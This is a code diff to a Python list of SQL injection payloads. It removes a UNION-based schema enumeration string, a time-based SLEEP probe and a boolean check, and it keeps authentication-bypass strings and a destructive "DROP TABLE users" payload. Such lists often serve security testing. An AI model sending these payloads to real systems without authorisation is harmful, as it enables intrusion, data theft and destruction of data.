@@ -19,11 +19,6 @@ sql_payloads = [
     r"' OR 1=1/*",
     r"'; DROP TABLE users --",
     r'" OR "a"="a" --',
-    r"1' AND (SELECT COUNT(*) FROM users) > 0 --",
-    # New payloads
-    r"' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=DATABASE() --",
-    r"' OR IF(1=1, SLEEP(5), 0) --",
-    # Added payload
     r"admin' OR '1'='1",  # New payload for SQL injection
 ]
 
